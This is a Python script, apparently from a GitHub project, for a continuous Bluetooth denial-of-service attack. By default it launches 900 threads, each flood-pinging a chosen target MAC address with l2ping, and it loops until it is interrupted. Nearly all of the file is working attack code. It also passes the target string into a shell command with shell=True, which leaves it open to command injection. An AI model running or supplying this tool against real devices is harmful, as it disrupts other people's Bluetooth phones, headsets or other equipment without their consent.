"""
Simple script for looping a Denial Of Service attack over one single mac address in range.
If Mac address is down or not in range, it will keep trying to attack the target until user press CTRL+C.
WARNING: It only works on Linux systems because it depends on l2ping tool
Author: W1s3m4n
Github: https://github.com/w1s3m4n/BluetoothSimpleDoS.git
"""
import threading
from subprocess import Popen
import argparse

global stop, attemp


def DoS(target, packet_size, verbose):
    
    global stop
    
    if stop:
        exit(0)
    try:

        quiet = ''
        if not verbose:
            quiet = ' > /dev/null 2>&1'

        Popen(['l2ping -i hci0 -s ' + str(packet_size) +' -f ' + target + quiet], shell=True, stdout=None, stderr=None)
    except KeyboardInterrupt:
        stop = True
    except Exception:
        return


def main(mac, nthreads, packet_size, verbose):

    global stop, attemp

    if stop:
        exit(0)

    threads = []
    for i in range(0, nthreads):
        threads.append(threading.Thread(target=DoS, args=[mac, str(packet_size), verbose]))

    print("[*] Starting loop #{}...".format(attemp), end="\r", flush=True)
    
    try:
        for thread in threads:
            thread.start()
        
        for thread in threads:
            thread.join()
    
    except KeyboardInterrupt:
        stop = True
        print("CTRL+C pressed.")
        exit(0)


if __name__ == '__main__':

    my_parser = argparse.ArgumentParser(
        description='Simple script for create a continuos denial of service attack over one bluetooth target')
    
    # Add the arguments
    my_parser.add_argument('MAC', type=str, help="Target's MAC Address")
    my_parser.add_argument('-t', '--threads', default=900, type=int, help='Number of threads')
    my_parser.add_argument('-p', '--packetsize', type=int, default=650, required=False, help='Packet size (default: 650)')
    my_parser.add_argument('-v', '--verbose', required=False, action='store_true', help='Verbose')


    args = my_parser.parse_args()

    mac = args.MAC
    nthreads = args.threads
    verbose = args.verbose
    packet_size = args.packetsize

    stop = False
    attemp = 1

    try:
        while True:
            if stop:
                exit()
            main(mac, nthreads, packet_size, verbose)
            attemp += 1
    except KeyboardInterrupt:
        stop = True
        exit(0)
